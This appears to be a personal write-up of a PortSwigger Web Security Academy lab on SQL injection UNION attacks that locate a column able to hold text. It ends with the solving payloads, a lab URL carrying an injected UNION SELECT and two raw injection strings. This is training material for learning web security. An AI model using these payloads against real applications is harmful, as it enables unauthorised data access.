
# Lab: SQL injection UNION attack, finding a column containing text

PRACTITIONER

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a [previous lab](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns). The next step is to identify a column that is compatible with string data.

The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.

```java
https://0aeb00d10343601a80e7a386004300f7.web-security-academy.net/filter?category=%27union%20select%20null,%275nEDvO%27,null%20--%20-

' union select null,null,null -- -
'union select null,'5nEDvO',null -- -
```


![[class8.png]]